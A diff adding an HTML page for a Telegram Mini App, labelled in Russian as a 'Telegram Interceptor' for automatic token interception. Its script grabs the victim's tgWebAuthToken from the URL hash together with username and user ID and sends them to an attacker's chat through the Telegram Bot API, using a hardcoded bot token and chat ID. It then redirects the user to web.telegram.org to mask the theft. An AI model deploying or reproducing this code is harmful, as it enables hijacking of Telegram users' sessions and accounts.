@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Auth</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #0088cc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: white;
+            font-size: 30px;
+        }
+        h2 {
+            color: #0088cc;
+            margin-bottom: 8px;
+        }
+        .status {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1px solid #e9ecef;
+        }
+        .loader {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #e9ecef;
+            border-radius: 50%;
+            border-top-color: #0088cc;
+            animation: spin 1s linear infinite;
+            margin: 10px 0;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .success {
+            color: #00a884;
+            font-weight: 500;
+        }
+        .button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 12px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">🔐</div>
+        <h2>Telegram Interceptor</h2>
+        <p style="color: #666; margin-bottom: 20px;">Автоматический перехват токена</p>
+        
+        <div id="loading" class="loader"></div>
+        
+        <div id="status" class="status">
+            ⏳ Инициализация...
+        </div>
+        
+        <div id="result" class="status hidden">
+            <div id="tokenValue"></div>
+        </div>
+        
+        <div id="debug" style="font-size: 12px; color: #999; margin-top: 20px; text-align: left; border-top: 1px solid #eee; padding-top: 10px;"></div>
+    </div>
+
+    <script>
+        // Функция для дебага
+        function debugLog(msg) {
+            console.log(msg);
+            let debugDiv = document.getElementById('debug');
+            debugDiv.innerHTML = msg + '<br>' + debugDiv.innerHTML;
+        }
+
+        debugLog('🚀 Скрипт запущен');
+
+        // Инициализация Telegram WebApp
+        let tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        
+        debugLog('✅ Telegram WebApp готов');
+
+        // ТВОЙ ТОКЕН БОТА (ЗАМЕНИ НА СВОЙ!)
+        const BOT_TOKEN = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'; // ⚠️ ВСТАВЬ СВОЙ ТОКЕН!!!
+        
+        // ТВОЙ ЧАТ ID (узнай у @userinfobot)
+        const CHAT_ID = '8220267007'; // ⚠️ ВСТАВЬ СВОЙ ЧАТ ID!!!
+
+        // Функция отправки в Telegram
+        async function sendToTelegram(message) {
+            try {
+                let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                let response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                let data = await response.json();
+                debugLog('📤 Отправлено в Telegram: ' + (data.ok ? '✅' : '❌'));
+                return data.ok;
+            } catch(e) {
+                debugLog('❌ Ошибка отправки: ' + e.message);
+                return false;
+            }
+        }
+
+        // Функция отправки через WebApp
+        function sendViaWebApp(data) {
+            try {
+                tg.sendData(data);
+                debugLog('📤 Отправлено через WebApp');
+                return true;
+            } catch(e) {
+                debugLog('❌ Ошибка WebApp: ' + e.message);
+                return false;
+            }
+        }
+
+        // Главная функция
+        async function intercept() {
+            let statusDiv = document.getElementById('status');
+            let loadingDiv = document.getElementById('loading');
+            let resultDiv = document.getElementById('result');
+            let tokenDiv = document.getElementById('tokenValue');
+            
+            // Получаем URL
+            let currentUrl = window.location.href;
+            let hash = window.location.hash;
+            
+            debugLog('📍 Текущий URL: ' + currentUrl);
+            debugLog('#️⃣ Хеш: ' + (hash || 'пусто'));
+
+            // Проверяем наличие токена
+            if (hash && hash.includes('tgWebAuthToken')) {
+                // НАШЛИ ТОКЕН!
+                loadingDiv.style.display = 'none';
+                statusDiv.classList.add('hidden');
+                resultDiv.classList.remove('hidden');
+                
+                tokenDiv.innerHTML = '🔑 <b>Токен найден!</b><br><br>' + hash.substring(0, 100) + '...';
+                
+                debugLog('🎉 ТОКЕН НАЙДЕН!');
+                
+                // Отправляем всеми способами
+                let message = `🔐 <b>ПЕРЕХВАЧЕН ТОКЕН!</b>\n\n👤 Пользователь: ${tg.initDataUnsafe?.user?.username || 'неизвестно'}\n🆔 ID: ${tg.initDataUnsafe?.user?.id || 'нет'}\n🔑 Токен: ${hash}`;
+                
+                // Способ 1: Через WebApp
+                sendViaWebApp(hash);
+                
+                // Способ 2: Через API
+                await sendToTelegram(message);
+                
+                // Способ 3: Сохраняем в localStorage
+                localStorage.setItem('last_token', hash);
+                
+                // Через 3 секунды перенаправляем
+                setTimeout(() => {
+                    debugLog('🔄 Перенаправление на web.telegram.org');
+                    window.location.href = 'https://web.telegram.org/k/';
+                }, 3000);
+                
+            } else {
+                // Токена нет - идем получать
+                statusDiv.innerHTML = '🔄 Перенаправление на Telegram для авторизации...';
+                debugLog('🔄 Токена нет, редирект на web.telegram.org');
+                
+                // Редирект
+                setTimeout(() => {
+                    window.location.href = 'https://web.telegram.org/k/';
+                }, 1500);
+            }
+        }
+
+        // Слушаем изменения hash
+        window.addEventListener('hashchange', function() {
+            debugLog('🔄 Hash изменился: ' + window.location.hash);
+            intercept();
+        });
+
+        // Запускаем
+        intercept();
+    </script>
+</body>
+</html>
